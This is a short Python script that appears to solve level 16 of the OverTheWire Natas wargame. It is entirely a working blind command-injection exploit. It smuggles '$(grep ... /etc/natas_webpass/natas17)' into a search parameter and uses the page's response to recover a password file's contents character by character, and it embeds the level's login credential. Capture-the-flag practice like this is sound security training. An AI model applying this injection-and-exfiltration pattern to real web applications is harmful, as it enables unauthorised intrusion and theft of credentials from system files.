#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File              : exploit_for_natas16.py
# Author            : Amar Lakshya <amar.lakshya@xaviers.edu.in>
# Date              : 23.08.2019
# Last Modified Date: 23.08.2019
# Last Modified By  : Amar Lakshya <amar.lakshya@xaviers.edu.in>
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''
for char in chars:
    Data = {'needle': 'Chicanos$(grep '+char +
            ' /etc/natas_webpass/natas17)', 'submit': 'Search'}
    r = requests.get('http://natas16.natas.labs.overthewire.org/?',
                     auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), params=Data)
    if not 'Chicanos' in r.text:
        filtered = filtered + char
        print(filtered)

#filtered = 'bcdghkmnqrswAGHNPQSW035789'

for i in range(0, 32):
    for char in filtered:
        Data = {
            'needle': 'Chicanos$(grep ^'+passwd + char+' /etc/natas_webpass/natas17)', 'submit': 'Search'}
        r = requests.get('http://natas16.natas.labs.overthewire.org/?',
                         auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), params=Data)
        if not 'Chicanos' in r.text:
            passwd = passwd + char
            print(passwd)
            break
